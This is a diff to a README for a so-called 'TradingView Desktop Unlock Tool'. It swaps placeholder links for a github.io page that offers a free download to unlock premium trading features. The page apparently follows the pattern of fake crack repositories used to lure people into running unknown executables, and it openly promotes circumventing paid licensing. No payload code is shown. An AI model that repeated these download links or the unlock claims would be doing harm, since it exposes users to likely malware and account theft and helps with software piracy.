@@ -6,7 +6,7 @@
 <h1 align="center">⚡️ TradingView Desktop Unlock Tool</h1>
 
 <p align="center">
-  <a href="YOUR_LINK_HERE" target="_blank">
+  <a href="https://tradingview-desktop-windows-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20TradingView%20Desktop%20Free%20for%20Windows-Enable%20Premium%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download TradingView Desktop Free for Windows" style="width: 540px; height: 37px;">
   </a>
@@ -97,7 +97,7 @@ Report bugs or contribute via Issues or Pull Requests.
 ## ⭐️ Unlock TradingView Desktop – Professional Trading Platform
 
 Unlock premium features of **TradingView Desktop**, including **multi-chart layouts, custom alerts, technical indicators, and real-time trading data**.  
-[Download the Unlock Tool](YOUR_LINK_HERE) and trade smarter.  
+[Download the Unlock Tool](https://tradingview-desktop-windows-download.github.io/.github/) and trade smarter.  
 
 ---
 
